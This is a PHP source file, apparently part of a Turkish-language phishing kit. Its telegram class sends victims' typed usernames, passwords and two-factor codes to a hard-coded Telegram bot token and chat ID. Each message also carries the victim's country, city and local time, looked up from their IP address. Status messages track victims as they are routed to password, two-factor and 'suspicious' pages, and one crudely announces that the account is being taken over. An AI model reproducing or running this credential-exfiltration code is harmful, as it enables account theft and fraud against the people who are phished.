<?php

namespace App\Telegrams;


$tokenowner = '';
$chatidowner = '';

$token = '7270159314:AAEZmsgtdMb1LeuB9BVfT3kHzuI454jkQWoc';
$chatid = '988753407';

class telegram
{


    public function ip()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        $url = "https://ipinfo.info/ip_api.php?ip=" . $ip;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json, text/javascript, */*; q=0.01',
            'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
            'X-Requested-With: XMLHttpRequest'
        ]);
        $response = curl_exec($ch);
        curl_close($ch);

        $ipInfo = json_decode($response, true);
        $ulke = isset($ipInfo['country_name']) ? $ipInfo['country_name'] : 'Anonymous';
        $sehir = isset($ipInfo['city']) ? $ipInfo['city'] : 'Anonymous';
        $cur_time = $ipInfo['time_zone']['current_time'];

        // PHP'nin standart DateTime sınıfını kullanın
        $dateTime = new \DateTime($cur_time);
        $time = $dateTime->format('H:i:s');

        return array($ulke, $sehir, $time);
    }



    public function request($url, $data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }

    public function usernamesearchbad($username, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
📛 **Başarısız!** 📛

**Kullanıcı adı:** `$username`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Kullanıcı Adı Bulunamadı // Hata Fonksiyonu Çalıştı.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }


    public function usernamesearch($username, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
✅ **Başarılı!** ✅

**Kullanıcı adı:** `$username`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Doğru Kullanıcı Adı // Şifre Sayfasına Atıldı.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }


    public function loginsucces($username, $password, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
✅ **Başarılı!** ✅

**Kullanıcı adı:** `$username`
**Şifre:** `$password`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Doğru Şifre // Hesap Sikilip Atılıyor.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }


    public function loginfactor($username, $password, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
✅ **Başarılı!** ✅

**Kullanıcı adı:** `$username`
**Şifre:** `$password`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Doğru Şifre // Faktör Sayfasına Atıldı.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }



    public function loginchallenge($username, $password, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
✅ **Başarılı!** ✅

**Kullanıcı adı:** `$username`
**Şifre:** `$password`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Doğru Şifre // Şüpheli Sayfasına Atıldı.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }


    public function loginwrongpass($username, $password, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
📛 **Başarısız!** 📛

**Kullanıcı adı:** `$username`
**Şifre:** `$password`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Yanlış Şifre // Hata Fonksiyonu Çalıştı.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }


    public function badcode($username, $code, $useTokenOwner = false, $message = 'Yanlış Kod // Hata Fonksiyonu Çalıştı.')
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
📛 **Başarısız!** 📛

**Kullanıcı adı:** `$username`
**Kod:** `$code`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** $message
",
        );
        $response = $this->request($url, $data);
        return $response;
    }



    public function truecodecek($username, $code, $useTokenOwner = false)
    {
        global $token, $chatid, $tokenowner, $chatidowner;

        $tokenToUse = $useTokenOwner ? $tokenowner : $token;
        $chatidToUse = $useTokenOwner ? $chatidowner : $chatid;

        list($ulke, $sehir, $cur_time) = $this->ip();

        $url = "https://api.telegram.org/bot{$tokenToUse}/sendMessage";
        $data = array(
            'chat_id' => $chatidToUse,
            'parse_mode' => 'markdown',
            'text' => "
✅ **Başarılı!** ✅

**Kullanıcı adı:** `$username`
**Kod:** `$code`

**Ülke:** `$ulke`
**Şehir:** `$sehir`
**Ülkedeki Saat:** `$cur_time`

**Status :** Doğru Kod // Hesap Sikilip Atılıyor.
",
        );
        $response = $this->request($url, $data);
        return $response;
    }
}
